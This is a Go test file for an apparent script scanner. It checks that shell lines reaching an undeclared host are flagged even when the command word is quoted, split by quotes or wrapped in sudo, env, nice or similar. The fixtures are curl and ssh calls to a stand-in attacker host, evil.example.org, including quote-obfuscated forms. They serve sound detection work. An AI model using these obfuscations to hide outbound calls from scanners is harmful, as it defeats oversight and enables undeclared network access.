package scan

import "testing"

const s6QuotedManifest = `{"capabilities":{"exec":{"commands":["curl","ssh","sudo","doas","nice","nohup","timeout","env"]}}}`

// TestS6ReadsAQuotedCommandWord pins that a command word is read as the
// shell reads it, with its quotes removed, whole or partial, and that a
// quoted wrapper is still a wrapper; each line reaches a host the manifest
// does not declare.
func TestS6ReadsAQuotedCommandWord(t *testing.T) {
	for _, line := range []string{
		`curl -s https://evil.example.org/x`,
		`"curl" -s https://evil.example.org/x`,
		`'curl' -s https://evil.example.org/x`,
		`c"url" -s https://evil.example.org/x`,
		`cu'r'l -s https://evil.example.org/x`,
		`"/usr/bin/curl" -s https://evil.example.org/x`,
		`ssh admin@evil.example.org`,
		`"ssh" admin@evil.example.org`,
		`'ssh' admin@evil.example.org uptime`,
		`s"s"h admin@evil.example.org`,
		`"sudo" ssh admin@evil.example.org`,
		`'sudo' -u deploy "ssh" admin@evil.example.org`,
		`"env" ssh admin@evil.example.org`,
	} {
		got := s6Run(t, s6QuotedManifest, map[string]string{"run.sh": "#!/bin/sh\n" + line + "\n"})
		if f, ok := got["S6/undeclared-network"]; !ok || f.Detail["host"] != "evil.example.org" {
			t.Errorf("%s: undeclared-network = %+v (found %v)", line, f.Detail, ok)
		}
	}
}

// TestS6SkipsAssignmentsAfterAWrapper pins that NAME=value words after a
// wrapper are passed over, as they are before a command, so the program
// after them is still the command.
func TestS6SkipsAssignmentsAfterAWrapper(t *testing.T) {
	for _, line := range []string{
		`sudo FOO=1 ssh admin@evil.example.org`,
		`sudo -u deploy FOO=1 BAR="a b" ssh admin@evil.example.org`,
		`sudo FOO=1 /usr/bin/ssh admin@evil.example.org`,
		`doas FOO=1 ssh admin@evil.example.org`,
		`nice -n 5 FOO=1 ssh admin@evil.example.org`,
		`nohup FOO=1 ssh admin@evil.example.org`,
		`timeout 5 FOO=1 ssh admin@evil.example.org`,
		`env FOO=1 ssh admin@evil.example.org`,
		`sudo env FOO=1 nice ssh admin@evil.example.org`,
		`if FOO=1 ssh admin@evil.example.org true; then :; fi`,
	} {
		got := s6Run(t, s6QuotedManifest, map[string]string{"run.sh": "#!/bin/sh\n" + line + "\n"})
		if f, ok := got["S6/undeclared-network"]; !ok || f.Detail["host"] != "evil.example.org" {
			t.Errorf("%s: undeclared-network = %+v (found %v)", line, f.Detail, ok)
		}
	}
}

// TestS6QuotedWordsThatAreNotCommands pins the other side: a quoted
// command name that is an argument, a whole line inside one quoted word
// (with or without a slash), an assignment alone and a variable command
// are not network calls or writes.
func TestS6QuotedWordsThatAreNotCommands(t *testing.T) {
	for _, line := range []string{
		`echo "curl" evil.example.org`,
		`printf '%s\n' "ssh admin@evil.example.org"`,
		`"ssh admin@evil.example.org"`,
		`X="curl"; echo evil.example.org`,
		`"$CMD" evil.example.org`,
		`grep -e 'ssh' notes.txt evil.example.org`,
		`"curl https://evil.example.org/x/curl"`,
		`"cat docs/mv" evil.example.org`,
		`"ssh admin@evil.example.org/ssh"`,
	} {
		got := s6Run(t, s6QuotedManifest, map[string]string{"run.sh": "#!/bin/sh\n" + line + "\n"})
		for _, scanner := range []string{"S6/undeclared-network", "S6/undeclared-fs-write"} {
			if f, ok := got[scanner]; ok {
				t.Errorf("%s: unexpected %s %+v", line, scanner, f.Detail)
			}
		}
	}
}
